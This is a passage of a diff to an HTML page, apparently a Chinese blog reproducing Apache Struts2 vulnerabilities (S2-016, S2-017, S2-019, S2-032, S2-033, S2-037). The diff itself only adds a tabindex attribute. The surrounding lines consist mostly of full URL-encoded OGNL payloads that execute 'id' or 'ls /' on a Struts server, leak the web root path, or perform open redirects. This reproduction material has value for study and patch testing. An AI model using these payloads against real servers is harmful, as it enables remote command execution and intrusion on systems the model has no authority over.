 </code></pre><p><code>Message</code>为<code>/2.jsp</code>。</p>
-<pre><code>%24%7B%23context%5B%27xwork%2EMethodAccessor%2EdenyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23%5FmemberAccess%2EgetClass%28%29%2EgetDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m%2EsetAccessible%28true%29%2C%23m%2Eset%28%23%5FmemberAccess%2Ctrue%29%2C%23q%3D%40org%2Eapache%2Ecommons%2Eio%2EIOUtils%40toString%28%40java%2Elang%2ERuntime%40getRuntime%28%29%2Eexec%28%27id%27%29%2EgetInputStream%28%29%29%2C%23q%7D%2Eaction
+<pre tabindex=0><code>%24%7B%23context%5B%27xwork%2EMethodAccessor%2EdenyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23%5FmemberAccess%2EgetClass%28%29%2EgetDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m%2EsetAccessible%28true%29%2C%23m%2Eset%28%23%5FmemberAccess%2Ctrue%29%2C%23q%3D%40org%2Eapache%2Ecommons%2Eio%2EIOUtils%40toString%28%40java%2Elang%2ERuntime%40getRuntime%28%29%2Eexec%28%27id%27%29%2EgetInputStream%28%29%29%2C%23q%7D%2Eaction
 </code></pre><p>执行<code>id</code>命令，<code>Message</code>处为执行结果。</p>
 <h1 id=struts2-s2-016-通过操作前缀actionredirectredirectaction参数造成远程命令执行漏洞-cve-2013-2251>Struts2 S2-016 通过操作前缀<code>action:</code>、<code>redirect:</code>、<code>redirectAction:</code>参数造成远程命令执行漏洞 CVE-2013-2251<a hidden class=anchor aria-hidden=true href=#struts2-s2-016-通过操作前缀actionredirectredirectaction参数造成远程命令执行漏洞-cve-2013-2251>#</a></h1>
 <h2 id=漏洞描述-28>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-28>#</a></h2>
@@ -953,12 +953,12 @@ all		：	链接包含GET和POST所有参数和值
 <p><code>Struts 2.0.0 ~ 2.3.15</code></p>
 <h2 id=漏洞复现-24>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-24>#</a></h2>
 <p><code>POC</code>：</p>
-<pre><code>http://&lt;ip&gt;:&lt;port&gt;/index.action?redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%7D
+<pre tabindex=0><code>http://&lt;ip&gt;:&lt;port&gt;/index.action?redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%7D
 </code></pre><p>执行了<code>id</code>命令，结果回显在<code>URL</code>。</p>
-<pre><code>redirect:%24%7b%23%61%3d%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%50%72%6f%63%65%73%73%42%75%69%6c%64%65%72%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%5b%5d%7b%27%6c%73%27%2c%27%2f%27%7d%29%29%2e%73%74%61%72%74%28%29%2c%23%62%3d%23%61%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%63%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%23%62%29%2c%23%64%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%23%63%29%2c%23%65%3d%6e%65%77%20%63%68%61%72%5b%35%30%30%30%30%5d%2c%23%64%2e%72%65%61%64%28%23%65%29%2c%23%6d%61%74%74%3d%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%64%69%73%70%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%76%6c%65%74%52%65%73%70%6f%6e%73%65%27%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%70%72%69%6e%74%6c%6e%28%23%65%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%66%6c%75%73%68%28%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%63%6c%6f%73%65%28%29%7d
+<pre tabindex=0><code>redirect:%24%7b%23%61%3d%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%50%72%6f%63%65%73%73%42%75%69%6c%64%65%72%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%5b%5d%7b%27%6c%73%27%2c%27%2f%27%7d%29%29%2e%73%74%61%72%74%28%29%2c%23%62%3d%23%61%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%63%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%23%62%29%2c%23%64%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%23%63%29%2c%23%65%3d%6e%65%77%20%63%68%61%72%5b%35%30%30%30%30%5d%2c%23%64%2e%72%65%61%64%28%23%65%29%2c%23%6d%61%74%74%3d%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%64%69%73%70%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%76%6c%65%74%52%65%73%70%6f%6e%73%65%27%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%70%72%69%6e%74%6c%6e%28%23%65%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%66%6c%75%73%68%28%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%63%6c%6f%73%65%28%29%7d
 </code></pre><p>执行<code>ls</code>命令，结果以文件返回。</p>
 <p>爆路径<code>EXP</code>：</p>
-<pre><code>http://&lt;ip&gt;:&lt;port&gt;/index.action?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D
+<pre tabindex=0><code>http://&lt;ip&gt;:&lt;port&gt;/index.action?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D
 </code></pre><h1 id=struts2-s2-017-通过操作前缀redirectredirectaction参数引入漏洞允许打开重定向-cve-2013-2248>Struts2 S2-017 通过操作前缀<code>redirect:</code>、<code>redirectAction:</code>参数引入漏洞允许打开重定向 CVE-2013-2248<a hidden class=anchor aria-hidden=true href=#struts2-s2-017-通过操作前缀redirectredirectaction参数引入漏洞允许打开重定向-cve-2013-2248>#</a></h1>
 <h2 id=漏洞描述-29>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-29>#</a></h2>
 <p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-017>S2-017 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
@@ -967,7 +967,7 @@ all		：	链接包含GET和POST所有参数和值
 <p><code>Struts 2.0.0 ~ 2.3.15</code></p>
 <h2 id=漏洞复现-25>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-25>#</a></h2>
 <p><code>POC</code>：</p>
-<pre><code>http://&lt;ip&gt;:&lt;port&gt;/showcase.action?redirect:http://oopsdc.tk/
+<pre tabindex=0><code>http://&lt;ip&gt;:&lt;port&gt;/showcase.action?redirect:http://oopsdc.tk/
 http://&lt;ip&gt;:&lt;oprt&gt;/fileupload/upload.action?redirect:http://oopsdc.tk/
 http://&lt;ip&gt;:&lt;oprt&gt;/modelDriven/modelDriven.action?redirectAction:http://oopsdc.tk/
 </code></pre><h1 id=struts2-s2-018-访问控制漏洞>Struts2 S2-018 访问控制漏洞<a hidden class=anchor aria-hidden=true href=#struts2-s2-018-访问控制漏洞>#</a></h1>
@@ -1034,7 +1034,7 @@ http://&lt;ip&gt;:&lt;oprt&gt;/modelDriven/modelDriven.action?redirectAction:htt
     <span style=color:#f92672>&lt;</span><span style=color:#960050;background-color:#1e0010>/body&gt;</span>
 <span style=color:#f92672>&lt;</span><span style=color:#960050;background-color:#1e0010>/html&gt;</span>
 </code></pre></div><p><code>URL</code>：</p>
-<pre><code>http://&lt;ip&gt;:&lt;port&gt;/index.jsp?a=1
+<pre tabindex=0><code>http://&lt;ip&gt;:&lt;port&gt;/index.jsp?a=1
 </code></pre><p>生成<code>tmp/th1s_1s_test</code>。</p>
 <h1 id=struts2-s2-020-将commons-fileupload升级到版本131避免dos攻击并添加class以排除parametersinterceptor中的params避免classloader操作>Struts2 S2-020 将Commons FileUpload升级到版本1.3.1(避免DoS攻击)并添加&rsquo;class&rsquo;以排除ParametersInterceptor中的params(避免ClassLoader操作)<a hidden class=anchor aria-hidden=true href=#struts2-s2-020-将commons-fileupload升级到版本131避免dos攻击并添加class以排除parametersinterceptor中的params避免classloader操作>#</a></h1>
 <p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-020>S2-020 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
@@ -1072,10 +1072,10 @@ http://&lt;ip&gt;:&lt;oprt&gt;/modelDriven/modelDriven.action?redirectAction:htt
 cd vulhub/struts2/s2-012
 docker-compose up -d
 </code></pre></div><p><code>URL</code>：</p>
-<pre><code>http://&lt;ip&gt;:&lt;port&gt;/index.jsp
+<pre tabindex=0><code>http://&lt;ip&gt;:&lt;port&gt;/index.jsp
 </code></pre><p>开启动态方法调用，使用<code>?method：execute</code>方法调用<code>execute</code>方法(<code>struts2</code>默认的<code>action</code>调用方法)，在<code>method</code>后加上要执行的<code>OGNL</code>表达式即可执行任意代码。</p>
 <p><code>POC</code>：</p>
-<pre><code>http://&lt;ip&gt;:&lt;port&gt;/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%20&amp;encoding=UTF-8&amp;cmd=id
+<pre tabindex=0><code>http://&lt;ip&gt;:&lt;port&gt;/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%20&amp;encoding=UTF-8&amp;cmd=id
 
 http://&lt;ip&gt;:&lt;port&gt;/index.action?method:%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%23res%3D%40org.apache.struts2.ServletActionContext%40getResponse()%2C%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D)%2C%23w%3D%23res.getWriter()%2C%23a%3Dnew%20java.util.Scanner(%40java.lang.Runtime%40getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.d%5B0%5D)%2C%23str%3D%23a.hasNext()%3F%23a.next()%3A%23parameters.dd%5B0%5D%2C%23w.print(%23str)%2C%23w.close()%2C%23request.toString&amp;cmd=id&amp;dd=%20&amp;d=____A&amp;encoding=UTF-8
 </code></pre><p>回显<code>id</code>命令结果。</p>
@@ -1087,7 +1087,7 @@ http://&lt;ip&gt;:&lt;port&gt;/index.action?method:%23_memberAccess%3D%40ognl.Og
 <p><code>Struts 2.3.20 ~ 2.3.28 (2.3.20.3、2.3.24.3除外)</code></p>
 <h2 id=漏洞复现-28>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-28>#</a></h2>
 <p><code>POC</code>：</p>
-<pre><code>%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23process%3D@java.lang.Runtime@getRuntime%28%29.exec%28%23parameters.command[0]),%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%2C@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%2C%23ros.flush%28%29,%23xx%3d123,%23xx.toString.json?&amp;command=id
+<pre tabindex=0><code>%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23process%3D@java.lang.Runtime@getRuntime%28%29.exec%28%23parameters.command[0]),%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%2C@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%2C%23ros.flush%28%29,%23xx%3d123,%23xx.toString.json?&amp;command=id
 </code></pre><p>回显<code>id</code>命令结果。</p>
 <h1 id=struts2-s2-034-ognl缓存中毒导致的dos漏洞>Struts2 S2-034 OGNL缓存中毒导致的DoS漏洞<a hidden class=anchor aria-hidden=true href=#struts2-s2-034-ognl缓存中毒导致的dos漏洞>#</a></h1>
 <p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-034>S2-034 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
@@ -1103,7 +1103,7 @@ http://&lt;ip&gt;:&lt;port&gt;/index.action?method:%23_memberAccess%3D%40ognl.Og
 <p><code>Struts 2.3.20 ~ 2.3.28.1(2.3.20.3、2.3.24.3除外)</code></p>
 <h2 id=漏洞复现-29>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-29>#</a></h2>
 <p><code>POC</code>：</p>
-<pre><code>/orders/4/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=7556&amp;command=id
+<pre tabindex=0><code>/orders/4/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=7556&amp;command=id
 </code></pre><p>回显<code>id</code>命令执行结果。</p>
 <h1 id=struts2-s2-045-基于jakarta-multipart解析器执行文件上载时可能的远程执行代码>Struts2 S2-045 基于Jakarta Multipart解析器执行文件上载时可能的远程执行代码<a hidden class=anchor aria-hidden=true href=#struts2-s2-045-基于jakarta-multipart解析器执行文件上载时可能的远程执行代码>#</a></h1>
 <h2 id=漏洞描述-34>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-34>#</a></h2>
